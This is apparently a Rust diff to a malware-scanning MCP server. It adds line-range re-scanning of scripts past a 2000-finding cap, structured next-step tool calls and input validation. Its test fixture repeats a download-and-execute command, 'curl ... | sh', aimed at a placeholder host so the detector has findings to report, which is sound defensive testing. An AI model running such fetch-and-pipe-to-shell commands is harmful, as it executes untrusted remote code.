@@ -23,8 +23,8 @@ use crate::{
     },
     pdf_analysis::{scan_pdf, PdfScan, RiskLevel as PdfRisk},
     script_analysis::{
-        analyze_script, language_name, parse_script_language, resolve_script_language,
-        RiskLevel as ScriptRisk, ScriptReport, ScriptType,
+        analyze_script, analyze_script_lines, language_name, parse_script_language,
+        resolve_script_language, RiskLevel as ScriptRisk, ScriptReport, ScriptType,
     },
 };
 
@@ -38,9 +38,9 @@ use super::{
 };
 
 /// Cache key of a complete document result (it does not depend on any argument).
-const DOCUMENT_KEY: &str = "document:v2";
+const DOCUMENT_KEY: &str = "document:v3";
 /// Cache key of a complete script result (the language override changes it).
-const SCRIPT_KEY_PREFIX: &str = "script:v2";
+const SCRIPT_KEY_PREFIX: &str = "script:v3";
 
 const ANALYZE_DOCUMENT_DESCRIPTION: &str = "Analyze a PDF or a Microsoft Office file (.doc, \
 .xls, .ppt, .docx, .docm, .xlsm, .pptm) for risky content. PDF: structure (version, pages, \
@@ -58,7 +58,8 @@ extension and the content (override it with `language`). Reports download-and-ex
 dynamic execution of decoded data, encoded payloads, persistence, credential access and \
 defense evasion, each with the line number and the matching text. The first call returns a \
 summary and the first page of findings; narrow with `category` or `min_severity` and page with \
-`offset`/`limit`. Not for packages (use analyze_npm_package or analyze_python_package) or \
+`offset`/`limit`. A whole-file scan keeps 2000 findings; `line_from`/`line_to` scan a range of \
+lines again to reach the rest. Not for packages (use analyze_npm_package or analyze_python_package) or \
 binaries (use analyze_file). Results are capped at `max_output_bytes` (default 80000, \
 ceiling 400000).";
 
@@ -194,6 +195,14 @@ pub struct ScriptRequest {
     pub category: Option<String>,
     #[schemars(description = "Only findings at least this severe: low, medium, high or critical")]
     pub min_severity: Option<String>,
+    #[schemars(
+        description = "First line (1-based) to scan. With line_from or line_to the range is \
+                       scanned again, so findings beyond the 2000 kept for a whole file can be \
+                       reached"
+    )]
+    pub line_from: Option<usize>,
+    #[schemars(description = "Last line (1-based, inclusive) to scan; see line_from")]
+    pub line_to: Option<usize>,
     #[schemars(description = "Items to skip (default 0)")]
     pub offset: Option<usize>,
     #[schemars(description = "Items to return (default 50, at most 500)")]
@@ -400,31 +409,59 @@ fn pdf_findings(scan: &PdfScan) -> Vec<Value> {
     findings
 }
 
+/// One structured next step. The cached value does not know the path (it is keyed by
+/// content), so `file_path` is filled in from the request by [`add_file_path`].
+fn step(tool: &str, arguments: Value, gives: &str) -> Value {
+    json!({"tool": tool, "arguments": arguments, "gives": gives})
+}
+
+/// Put the request's `file_path` into every step's arguments.
+fn add_file_path(summary: &mut Value, file_path: &str) {
+    if let Some(steps) = summary["next_steps"].as_array_mut() {
+        for entry in steps {
+            if let Some(arguments) = entry.get_mut("arguments").and_then(Value::as_object_mut) {
+                arguments.insert("file_path".into(), json!(file_path));
+            }
+        }
+    }
+}
+
 fn pdf_document_value(scan: &PdfScan) -> Value {
     let findings = pdf_findings(scan);
     let mut counts = Map::new();
     for feature in &scan.features {
         counts.insert(feature.name.clone(), json!(feature.count));
     }
-    let mut next_steps = vec![
-        "analyze_document {file_path, category: \"action\"} lists each risky name with byte offsets"
-            .to_string(),
-    ];
+    let mut next_steps = vec![step(
+        "analyze_document",
+        json!({"category": "action"}),
+        "each risky name with byte offsets",
+    )];
     if !scan.scripts.is_empty() {
-        next_steps.push(
-            "analyze_document {file_path, category: \"script\"} shows the JavaScript".to_string(),
-        );
+        next_steps.push(step(
+            "analyze_document",
+            json!({"category": "script"}),
+            "the JavaScript",
+        ));
     }
     if !scan.targets.is_empty() {
-        next_steps.push(
-            "analyze_document {file_path, category: \"link\"|\"launch\"|\"submit\"} shows targets"
-                .to_string(),
-        );
+        next_steps.push(step(
+            "analyze_document",
+            json!({"category": "link"}),
+            "link targets (category launch or submit for those)",
+        ));
     }
-    next_steps.push(
-        "read_hex {file_path, offset, length} shows the raw bytes at an offset (an evidence offset above)"
-            .to_string(),
-    );
+    if let Some(offset) = scan
+        .features
+        .iter()
+        .find_map(|f| f.evidence.first().map(|e| e.offset))
+    {
+        next_steps.push(step(
+            "read_hex",
+            json!({"offset": offset, "length": 256}),
+            "the raw bytes at an evidence offset",
+        ));
+    }
     json!({
         "summary": {
             "format": "pdf",
@@ -566,24 +603,31 @@ fn office_document_value(report: &OfficeReport) -> Value {
     let has_macros = analysis.suspicious_indicators.has_macros;
     let mut next_steps = Vec::new();
     if has_macros {
-        next_steps.push(
-            "analyze_document {file_path, category: \"auto_exec\"} lists entry points that run on open"
-                .to_string(),
-        );
+        next_steps.push(step(
+            "analyze_document",
+            json!({"category": "auto_exec"}),
+            "entry points that run on open",
+        ));
         if module_rows.len() > SUMMARY_ROWS {
-            next_steps.push(format!(
-                "analyze_document {{file_path, category: \"modules\", offset: {SUMMARY_ROWS}}} lists the other {} modules",
-                module_rows.len() - SUMMARY_ROWS
+            next_steps.push(step(
+                "analyze_document",
+                json!({"category": "modules", "offset": SUMMARY_ROWS}),
+                &format!("the other {} modules", module_rows.len() - SUMMARY_ROWS),
             ));
         }
         if let Some(first) = module_rows.iter().find(|m| m["has_source"] == json!(true)) {
-            next_steps.push(format!(
-                "analyze_document {{file_path, module: \"{}\"}} pages through that module's source",
-                first["name"].as_str().unwrap_or("")
+            next_steps.push(step(
+                "analyze_document",
+                json!({"module": first["name"].as_str().unwrap_or("")}),
+                "that module's source, paged",
             ));
         }
     } else {
-        next_steps.push("analyze_file {file_path} for strings and a generic overview".to_string());
+        next_steps.push(step(
+            "analyze_file",
+            json!({}),
+            "strings and a generic overview",
+        ));
     }
     let metadata = &analysis.metadata;
     let mut notes = report.notes.clone();
@@ -743,7 +787,9 @@ fn slice_document(full: &Value, request: &DocumentRequest, cache: &str) -> Resul
             ));
         }
     }
-    out.insert("summary".into(), full["summary"].clone());
+    let mut summary = full["summary"].clone();
+    add_file_path(&mut summary, &request.file_path);
+    out.insert("summary".into(), summary);
     let all = if request.category.as_deref() == Some("modules") {
         full["module_rows"].as_array().cloned().unwrap_or_default()
     } else {
@@ -805,16 +851,27 @@ impl FileScannerMcp {
                 ));
             }
         }
+        if request.line_from == Some(0) || request.line_to == Some(0) {
+            return Err("line_from and line_to count lines from 1.".to_string());
+        }
+        if let (Some(from), Some(to)) = (request.line_from, request.line_to) {
+            if from > to {
+                return Err(format!(
+                    "line_from ({from}) is after line_to ({to}); pass a range from low to high."
+                ));
+            }
+        }
         let sha256 = calculate_sha256_only(path)
             .await
             .map_err(|error| format!("Cannot read {}: {error:#}", path.display()))?;
         let state = Arc::clone(&self.state);
         let owned = path.to_path_buf();
         let sha = sha256.clone();
+        let (from, to) = (request.line_from, request.line_to);
         let (full, cache, detected_by) = self
             .state
             .run_blocking("analyze_script", move || {
-                compute_script(&state, &sha, &owned, language)
+                compute_script(&state, &sha, &owned, language, from, to)
             })
             .await??;
         slice_script(&full, request, cache, detected_by)
@@ -855,9 +912,8 @@ fn compute_document(
     Ok((Arc::new(value), "miss"))
 }
 
-fn script_value(report: &ScriptReport) -> Value {
-    let findings: Vec<Value> = report
-        .findings
+fn script_finding_rows(findings: &[crate::script_analysis::ScriptFinding]) -> Vec<Value> {
+    findings
         .iter()
         .map(|f| {
             json!({
@@ -869,7 +925,11 @@ fn script_value(report: &ScriptReport) -> Value {
                 "description": f.description,
             })
         })
-        .collect();
+        .collect()
+}
+
+fn script_value(report: &ScriptReport) -> Value {
+    let findings = script_finding_rows(&report.findings);
     let powershell = report.powershell.as_ref().map(|ps| {
         json!({
             "commands": ps.commands.iter().take(50).collect::<Vec<_>>(),
@@ -881,20 +941,36 @@ fn script_value(report: &ScriptReport) -> Value {
         })
     });
     let mut next_steps = vec![
-        "analyze_script {file_path, category: \"<category>\"} lists one category's findings"
-            .to_string(),
-        "analyze_script {file_path, min_severity: \"high\"} keeps only the serious ones"
-            .to_string(),
+        step(
+            "analyze_script",
+            json!({"category": "download_execute"}),
+            "one category's findings (any category in the tool's list)",
+        ),
+        step(
+            "analyze_script",
+            json!({"min_severity": "high"}),
+            "only the serious findings",
+        ),
     ];
+    let mut notes: Vec<String> = Vec::new();
     if report.findings_total > report.findings.len() {
-        next_steps.push(format!(
-            "{} findings in all; only the first {} are kept and can be paged.",
+        let last = report.findings.last().map_or(1, |f| f.line);
+        notes.push(format!(
+            "{} findings in all; only the first {} are kept and can be paged. Pass line_from \
+             and line_to to scan a range of lines and reach the rest (the first {} cover \
+             lines up to {last}).",
             report.findings_total,
+            report.findings.len(),
             report.findings.len()
+        ));
+        next_steps.push(step(
+            "analyze_script",
+            json!({"line_from": last}),
+            "the findings from the last kept line on, re-scanned",
         ));
     }
     if report.truncated_input {
-        next_steps.push(
+        notes.push(
             "The file is larger than the scan limit; only the start was scanned.".to_string(),
         );
     }
@@ -912,6 +988,7 @@ fn script_value(report: &ScriptReport) -> Value {
             "findings_kept": report.findings.len(),
             "category_counts": report.category_counts,
             "powershell": powershell,
+            "notes": notes,
             "next_steps": next_steps,
         },
         "findings": findings,
@@ -926,9 +1003,39 @@ fn compute_script(
     sha256: &str,
     path: &Path,
     language: Option<ScriptType>,
+    line_from: Option<usize>,
+    line_to: Option<usize>,
 ) -> Result<(Arc<Value>, &'static str, &'static str), String> {
     let (resolved, detected_by) =
         resolve_script_language(path, language.clone()).map_err(|error| format!("{error:#}"))?;
+    if line_from.is_some() || line_to.is_some() {
+        // A range is scanned again and is not cached: it is the way past the findings cap.
+        mark_section("script pattern scan (line range)");
+        let whole = compute_script(state, sha256, path, Some(resolved.clone()), None, None)?.0;
+        let range = analyze_script_lines(path, resolved, line_from, line_to)
+            .map_err(|error| format!("{error:#}"))?;
+        let mut value = (*whole).clone();
+        value["findings"] = Value::Array(script_finding_rows(&range.findings));
+        value["summary"]["range"] = json!({
+            "line_from": line_from.unwrap_or(1),
+            "line_to": line_to.unwrap_or(range.line_count),
+            "line_count": range.line_count,
+            "findings_total": range.findings_total,
+            "findings_kept": range.findings.len(),
+            "note": if range.findings_total > range.findings.len() {
+                format!(
+                    "{} findings in this range; the first {} are kept. Narrow the range to \
+                     reach the rest.",
+                    range.findings_total,
+                    range.findings.len()
+                )
+            } else {
+                "Findings below are only those inside the range; the score and counts above \
+                 are for the whole file.".to_string()
+            },
+        });
+        return Ok((Arc::new(value), "miss", detected_by));
+    }
     let key = format!("{SCRIPT_KEY_PREFIX}:{}", language_name(&resolved));
     let cache = state.section_cache();
     if let Some(hit) = cache.get(sha256, &key) {
@@ -974,6 +1081,7 @@ fn slice_script(
     let mut out = Map::new();
     out.insert("cache".into(), json!(cache));
     let mut summary = full["summary"].clone();
+    add_file_path(&mut summary, &request.file_path);
     summary["detected_by"] = json!(detected_by);
     out.insert("summary".into(), summary);
     out.insert("findings".into(), page(&selected, offset, limit));
@@ -982,6 +1090,15 @@ fn slice_script(
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn add_file_path_tolerates_legacy_string_steps() {
+        let mut summary =
+            serde_json::json!({"next_steps": ["old prose step", {"tool": "t", "arguments": {}}]});
+        super::add_file_path(&mut summary, "/x");
+        assert_eq!(summary["next_steps"][0], "old prose step");
+        assert_eq!(summary["next_steps"][1]["arguments"]["file_path"], "/x");
+    }
+
     use std::io::Write;
 
     use rmcp::{
@@ -1063,6 +1180,49 @@ mod tests {
         assert_eq!(value["cache"], "hit");
         assert_eq!(value["findings"]["total"], 1);
         assert_eq!(value["findings"]["items"][0]["line"], 3);
+        client.cancel().await.unwrap();
+    }
+
+    #[tokio::test]
+    async fn line_range_reaches_findings_past_the_cap_and_steps_say_gives() {
+        let dir = TempDir::new().unwrap();
+        let path = dir.path().join("big.sh");
+        let body = "curl -s http://example.test/x.sh | sh\n".repeat(2600);
+        std::fs::write(&path, body).unwrap();
+        let client = client().await;
+        let ask = |args: serde_json::Value| call("analyze_script", args);
+        let first = client
+            .call_tool(ask(serde_json::json!({"file_path": path, "limit": 5})))
+            .await
+            .unwrap();
+        let value: serde_json::Value = serde_json::from_str(&text(&first)).unwrap();
+        assert_eq!(value["summary"]["findings_kept"], 2000);
+        assert!(value["summary"]["notes"][0]
+            .as_str()
+            .unwrap()
+            .contains("line_from"));
+        let steps = value["summary"]["next_steps"].as_array().unwrap();
+        assert!(steps
+            .iter()
+            .all(|s| s["gives"].is_string() && s.get("why").is_none()));
+        assert_eq!(steps[0]["arguments"]["file_path"], path.to_str().unwrap());
+        let tail = client
+            .call_tool(ask(
+                serde_json::json!({"file_path": path, "line_from": 2500, "limit": 500}),
+            ))
+            .await
+            .unwrap();
+        let value: serde_json::Value = serde_json::from_str(&text(&tail)).unwrap();
+        assert_eq!(value["findings"]["total"], 101);
+        assert_eq!(value["findings"]["items"][0]["line"], 2500);
+        assert_eq!(value["summary"]["range"]["findings_total"], 101);
+        let bad = client
+            .call_tool(ask(
+                serde_json::json!({"file_path": path, "line_from": 9, "line_to": 3}),
+            ))
+            .await
+            .unwrap();
+        assert_eq!(bad.is_error, Some(true));
         client.cancel().await.unwrap();
     }
 
